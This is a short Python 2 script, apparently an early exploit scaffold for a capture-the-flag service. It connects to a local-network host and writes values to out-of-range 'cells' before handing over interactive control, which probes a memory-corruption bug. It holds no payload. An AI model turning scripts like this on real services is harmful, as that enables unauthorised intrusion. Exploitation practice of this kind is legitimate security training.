from PwnIOI import *

s = IOI(['192.168.0.85',1234])
def write(cell,operation,arg1,arg2=0xff):
  if not(arg2==0xff):
    s.write('w %d %s %d %d\n'%(cell,operation,arg1,arg2))
  else:
    s.write('w %d %s %d\n'%(cell,operation,arg1))
def read(cell):
  s.write('r %d\n'%cell)
s.write('1234\n')
for i in xrange(6):
  raw_input(str(i))
  write(i+10,'=',1)
s.interact()
